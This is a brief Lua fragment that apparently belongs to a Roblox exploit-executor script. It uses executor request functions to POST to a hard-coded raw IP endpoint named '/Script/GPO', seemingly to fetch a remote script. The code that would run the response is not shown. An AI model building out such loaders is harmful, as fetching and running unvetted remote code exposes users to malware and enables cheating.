local req = request or http_request or (http and http.request) or (syn and syn.request)

local response, err = req({  
    Url = "http://164.92.109.98:5000/Script/GPO",
      Method = "POST",
})
